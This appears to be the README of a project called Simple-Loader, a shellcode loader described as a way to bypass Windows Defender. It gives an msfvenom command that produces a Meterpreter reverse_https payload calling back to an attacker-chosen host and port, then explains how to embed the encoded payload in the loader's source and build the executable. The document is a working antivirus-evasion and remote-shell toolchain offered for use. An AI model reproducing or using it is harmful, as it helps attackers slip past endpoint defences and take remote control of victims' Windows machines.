# Simple-Loader
An extendable Shell Code Loader to Bypass Windows Defender

## Modifying the payload
Edit the msfvenom command in `generate.sh`, for example:
```sh
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=4444 -f csharp -o /tmp/payload.txt
```

Running `generate.sh` gives an output:
```
public static string walrus = "base64 string...";
```

Replace the line in Simple-Loader/src/walrus.cs with the output from `generate.sh`

## Building
Running `./build.sh` builds the loader to Simple-Loader.exe
